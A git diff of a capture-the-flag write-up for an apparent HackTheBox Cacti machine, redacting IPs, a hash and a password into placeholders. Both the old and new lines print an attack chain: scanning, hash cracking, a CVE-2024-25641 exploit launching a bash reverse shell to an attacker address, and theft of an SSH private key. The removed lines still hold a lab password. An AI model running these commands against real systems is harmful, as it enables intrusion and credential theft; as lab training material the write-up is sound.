@@ -33,7 +33,7 @@ Nmap → dirsearch → ffuf → cacti.monitorsthree.htb
 ### Nmap Scan
 
 ```bash
-nmap -sC -sV 10.10.11.30 -oN scan.txt -Pn
+nmap -sC -sV <TARGET_IP> -oN scan.txt -Pn
 ```
 
 ![nmap scan](assets/scan.png)
@@ -109,7 +109,7 @@ We recover several hashed passwords and an `admin` credential.
 ### Cracking the Hash
 
 ```bash
-hashcat -m 0 -a 0 "31a181c8372e3afc59dab863430610e8" /usr/share/wordlists/rockyou.txt --show
+hashcat -m 0 -a 0 "<MD5_HASH>" /usr/share/wordlists/rockyou.txt --show
 ```
 
 One of the four hashes cracks successfully → password recovered.
@@ -134,8 +134,8 @@ nc -lnvp 4242
 
 ```bash
 python3 CVE-2024-25641.py http://cacti.monitorsthree.htb/cacti/ \
-  --user admin --pass greencacti2001 \
-  -x "bash -c 'bash -i >& /dev/tcp/10.10.16.27/4242 0>&1'"
+  --user admin --pass <ADMIN_PASSWORD> \
+  -x "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4242 0>&1'"
 ```
 
 ![reverse](assets/reverse.png)
@@ -168,14 +168,14 @@ python3 -m http.server
 
 ```bash
 # On Kali:
-wget http://10.10.11.30:8000/id_rsa
+wget http://<TARGET_IP>:8000/id_rsa
 ```
 
 ![wget](assets/wget.png)
 
 ```bash
 chmod 600 id_rsa
-ssh -i id_rsa marcus@10.10.11.30
+ssh -i id_rsa marcus@<TARGET_IP>
 ```
 
 ![ssh](assets/ssh.png)
